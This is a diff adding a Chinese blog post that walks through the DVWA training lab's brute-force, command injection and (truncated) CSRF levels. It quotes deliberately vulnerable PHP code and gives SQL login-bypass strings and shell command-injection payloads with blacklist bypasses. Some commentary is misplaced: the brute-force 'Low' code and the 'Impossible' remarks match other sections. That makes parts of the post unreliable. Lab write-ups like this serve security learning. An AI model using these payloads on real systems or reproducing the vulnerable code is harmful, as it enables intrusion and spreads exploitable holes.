@@ -1,0 +1,1230 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DVWA - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="Brute ForceLowif( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQU,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">DVWA</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">DVWA</h1>
+        <div class="stuff">
+            <span>二月 26, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>if( isset( $_GET[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Check database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";</code></pre>
+<p>可以采用暴力破解和SQL注入等方式(这里对admin和password没有过滤)</p>
+<h4 id="法一：burp爆破"><a href="#法一：burp爆破" class="headerlink" title="法一：burp爆破"></a>法一：burp爆破</h4><h5 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h5><h5 id="2-ctrl-I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加"><a href="#2-ctrl-I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加" class="headerlink" title="2.ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$"></a>2.ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$</h5><h5 id="3-选中Payloads，载入字典，点击Start-attack进行爆破"><a href="#3-选中Payloads，载入字典，点击Start-attack进行爆破" class="headerlink" title="3.选中Payloads，载入字典，点击Start attack进行爆破"></a>3.选中Payloads，载入字典，点击Start attack进行爆破</h5><h5 id="4-最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。"><a href="#4-最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。" class="headerlink" title="4.最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。"></a>4.最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</h5><h4 id="法二：SQL注入"><a href="#法二：SQL注入" class="headerlink" title="法二：SQL注入"></a>法二：SQL注入</h4><pre><code>admin’ or ’1′=’1  </code></pre>
+<p>或者</p>
+<pre><code>admin’ #</code></pre>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>此阶段在失败的登录页面上加上了sleep(2)，这意味着当我们输入的用户名或密码错误时，将需要等待额外的两秒钟才能看到错误页面。这只会减少单位时间内可处理的请求数量，从而使暴力破解的时间更长。</p>
+<p>另外，本阶段源码通过mysql-real-escape-string()函数对输入的用户名和密码中的特殊字符进行了转义，以防止sql注入，因此无法使用万能密钥登录。</p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Check the database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";
+        $html .= "&lt;img src=\"{$avatar}\" /&gt;";
+    }
+    else {
+        // Login failed
+        sleep( 2 );
+        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>与Low Level中的方法一相同，不再赘述。另外，如果要用户名密码一起爆破，可以将攻击类型改为cluster bomb模式。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Check database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";
+        $html .= "&lt;img src=\"{$avatar}\" /&gt;";
+    }
+    else {
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>登录验证提交了四个参数：username、password、user_token、login</p>
+<p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p>
+<p>源码使用了stripslashes()、 mysql_real_escape_string()对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
+<h4 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a><strong>stripslashes()</strong></h4><p>去除字符串中的反斜线字符，如果有两个连续的反斜线，则只去掉一个。</p>
+<h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h4><p>函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<ul>
+<li><ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+</li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<h5 id="错误页面使用了sleep-rand-0-3-，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。"><a href="#错误页面使用了sleep-rand-0-3-，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。" class="headerlink" title="错误页面使用了sleep( rand( 0, 3 ) );，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。"></a>错误页面使用了sleep( rand( 0, 3 ) );，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。</h5><h4 id="采用burp爆破"><a href="#采用burp爆破" class="headerlink" title="采用burp爆破"></a>采用burp爆破</h4><h5 id="1-抓包，发送到Intruder模块"><a href="#1-抓包，发送到Intruder模块" class="headerlink" title="1.抓包，发送到Intruder模块"></a>1.抓包，发送到Intruder模块</h5><h5 id="2-选择Pitchfork-草叉模式-，添加爆破的参数"><a href="#2-选择Pitchfork-草叉模式-，添加爆破的参数" class="headerlink" title="2.选择Pitchfork(草叉模式)，添加爆破的参数"></a>2.选择Pitchfork(草叉模式)，添加爆破的参数</h5><h5 id="3-在Options中找到Request-Engine模块，把线程数设为1"><a href="#3-在Options中找到Request-Engine模块，把线程数设为1" class="headerlink" title="3.在Options中找到Request Engine模块，把线程数设为1"></a>3.在Options中找到Request Engine模块，把线程数设为1</h5><h5 id="4-在Options中找到Rediections模块，选择always，允许重定向"><a href="#4-在Options中找到Rediections模块，选择always，允许重定向" class="headerlink" title="4.在Options中找到Rediections模块，选择always，允许重定向"></a>4.在Options中找到Rediections模块，选择always，允许重定向</h5><h5 id="5-在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user-token"><a href="#5-在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user-token" class="headerlink" title="5.在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token"></a>5.在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token</h5><h5 id="6-在Payloads中为选择的参数设置字典"><a href="#6-在Payloads中为选择的参数设置字典" class="headerlink" title="6.在Payloads中为选择的参数设置字典"></a>6.在Payloads中为选择的参数设置字典</h5><h5 id="7-点击start-attack，开始爆破"><a href="#7-点击start-attack，开始爆破" class="headerlink" title="7.点击start attack，开始爆破"></a>7.点击start attack，开始爆破</h5><h5 id="根据返回长度的大小，可以得到正确的用户密码"><a href="#根据返回长度的大小，可以得到正确的用户密码" class="headerlink" title="根据返回长度的大小，可以得到正确的用户密码"></a>根据返回长度的大小，可以得到正确的用户密码</h5><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {
+    // Check Anti-CSRF token---校验token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input----过滤、转义用户输入的username
+    $user = $_POST[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input----过滤、转义用户输入的password
+    $pass = $_POST[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
+
+    // Check the database (Check user information)
+　　 // 用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令
+    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // Check to see if the user has been locked out.----登录失败锁定机制：3次失败，锁定15分钟
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //$html .= "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";
+
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ 'last_login' ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        /*
+        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";
+        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";
+        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";
+        */
+
+        // Check to see if enough time has passed, if it hasn't locked the account
+        if( $timenow &lt; $timeout ) {
+            $account_locked = true;
+            // print "The account is locked&lt;br /&gt;";
+        }
+    }
+
+    // Check the database (if username matches the password)----尝试登录，PDO机制防御SQL注入
+    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // If its a valid login...
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {
+        // Get users details
+        $avatar       = $row[ 'avatar' ];
+        $failed_login = $row[ 'failed_login' ];
+        $last_login   = $row[ 'last_login' ];
+
+        // Login successful
+        $html .= "&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;";
+        $html .= "&lt;img src=\"{$avatar}\" /&gt;";
+
+        // Had the account been locked out since last login?
+        if( $failed_login &gt;= $total_failed_login ) {
+            $html .= "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;";
+            $html .= "&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;";
+        }
+
+        // Reset bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    } else {
+        // Login failed----如果登录失败，随机等待2-4秒后再返回错误信息
+        sleep( rand( 2, 4 ) );
+
+        // Give the user some feedback
+        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;";
+
+        // Update bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    }
+
+    // Set the last login time
+    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
+<p>这个确实已经结合业务场景来进行约束了。</p>
+<p><strong>暴力破解防护建议：</strong></p>
+<p>&lt;1&gt;登录页面采用有效的验证码机制<br>&lt;2&gt;对用户密码错误的次数做限制</p>
+<h1 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+//获取IP字段
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+//确定操作系统并执行ping命令
+// stristr(string,search,before_search)
+//stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配//点），如果未找到所搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参//数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值//的字符），可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函//数将返回search参数第一次出现之前的字符串部分。
+
+// php_uname(mode)
+//这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包//含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” //r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+<p><strong>tristr(string,search,before_search)</strong></p>
+<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回  FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII  值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search  参数第一次出现之前的字符串部分。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td><em>search</em></td>
+<td>必需。规定所搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td>
+</tr>
+<tr>
+<td><em>before_search</em></td>
+<td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-stristr.html">https://www.runoob.com/php/func-string-stristr.html</a></p>
+<p><strong>php_uname(mode)</strong></p>
+<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s  ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
+<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
+<p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
+<pre><code>127.0.0.1&amp;&amp;net user</code></pre>
+<pre><code>127.0.0.1&amp;&amp;dir</code></pre>
+<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Set blacklist
+//设置命令黑名单，里面包含&amp;&amp;和；
+    $substitutions = array(
+        '&amp;&amp;' =&gt; '',
+        ';'  =&gt; '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+//将参数中有&amp;&amp;和；的都替换成空
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+<h3 id="str-replace-find-replace-string"><a href="#str-replace-find-replace-string" class="headerlink" title="str_replace(find,replace,string)"></a><strong>str_replace(find,replace,string)</strong></h3><p>把字符串 string 中的字符 find 替换为 replace</p>
+<h4 id="DOS中-amp-用法"><a href="#DOS中-amp-用法" class="headerlink" title="DOS中&amp;用法"></a>DOS中&amp;用法</h4><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
+<p>Command 1&amp;&amp;Command 2</p>
+<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
+<p>Command 1&amp;Command 2</p>
+<p>先执行Command 1，不管是否成功，都会执行Command 2</p>
+<pre><code>127.0.0.1&amp;ipconfig</code></pre>
+<p>由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p>
+<pre><code>127.0.0.1&amp;;&amp;ipconfig</code></pre>
+<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = trim($_REQUEST[ 'ip' ]);
+
+    // Set blacklist
+//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ ' ||
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';'  =&gt; '',
+        '| ' =&gt; '',
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+//替换成空
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+
+?&gt;
+</code></pre>
+<p>这里吧&amp; ；| - $ ( ) \ ‘ ||券替</p>
+<p>Command 1 | Command 2</p>
+<p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
+<p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
+<p>6666</p>
+<p>127.0.0.1|net user</p>
+<h4 id="可用trim-函数解决这个问题，因为-trim-str-可以删除字符串左右两边的空格。"><a href="#可用trim-函数解决这个问题，因为-trim-str-可以删除字符串左右两边的空格。" class="headerlink" title="可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。"></a>可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。</h4><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+// stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。
+    $target = stripslashes( $target );
+
+    // Split the IP into 4 octects
+//将具体的IP以.分隔
+// explode(separator,string,limit)
+把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。
+    $octet = explode( ".", $target );
+
+    // Check IF each octet is an integer
+//检查是否分成了4块，并且每一块是否都为数字
+// s_numeric(string)
+检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。
+    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
+        // If all 4 octets are int's put the IP back together.
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+        // Determine OS and execute the ping command.
+        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+            // Windows
+            $cmd = shell_exec( 'ping  ' . $target );
+        }
+        else {
+            // *nix
+            $cmd = shell_exec( 'ping  -c 4 ' . $target );
+        }
+
+        // Feedback for the end user
+        echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+    }
+    else {
+        // Ops. Let the user name theres a mistake
+        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre>
+<p>可以看到，本等级的服务器源代码已被重写，只允许非常严格的输入。 如果不匹配并且没有产生特定结果，则将不允许执行它。 相比于前面2个等级的“黑名单”过滤（允许任何输入并删除不需要的内容），使用“<strong>白名单</strong>”（仅允许输入ip地址）更加安全。</p>
+<h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // 校验密码
+    if( $pass_new == $pass_conf ) {
+        // T相同使用mysqli-real-escape-string函数转义
